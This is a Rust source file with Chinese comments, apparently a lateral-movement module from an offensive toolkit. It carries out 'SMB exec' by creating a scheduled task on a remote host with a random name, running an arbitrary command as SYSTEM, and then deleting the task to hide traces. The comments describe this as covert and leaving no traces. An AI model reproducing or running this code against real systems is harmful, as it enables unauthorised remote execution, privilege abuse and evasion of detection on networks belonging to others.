//! SMB执行模块（不创建服务版本的横向移动）

use crate::lateral::LateralConfig;

/// SMB执行（通过共享 + 服务但不留痕迹）
pub async fn execute_smb_exec(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let target = &config.target;
    tracing::info!("[SMBexec] {} -> {}", whoami::hostname(), target);

    // 通过impacket风格的SMB执行
    // 使用SMB传输批处理命令
    execute_via_smb_cmd(config)
}

fn execute_via_smb_cmd(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let full_command = format!("{} {}", config.command, config.args.join(" "));

    // 使用schtasks作为回退方法（更隐蔽）
    let temp_name = crate::lateral::random_service_name();

    let result = std::process::Command::new("schtasks")
        .args([
            "/create",
            "/tn", &temp_name,
            "/tr", &full_command,
            "/s", &config.target,
            "/sc", "once",
            "/st", "00:00",
            "/ru", "SYSTEM",
            "/f",
        ])
        .output()
        .map_err(|e| format!("创建SMB任务失败: {}", e))?;

    if !result.status.success() {
        return Err(String::from_utf8_lossy(&result.stderr).to_string());
    }

    // 立即运行任务
    let run_result = std::process::Command::new("schtasks")
        .args([
            "/run",
            "/tn", &temp_name,
            "/s", &config.target,
        ])
        .output()
        .map_err(|e| format!("运行SMB任务失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&run_result.stdout).to_string();

    // 删除任务
    let _ = std::process::Command::new("schtasks")
        .args([
            "/delete",
            "/tn", &temp_name,
            "/s", &config.target,
            "/f",
        ])
        .output();

    Ok((stdout, String::new(), 0))
}
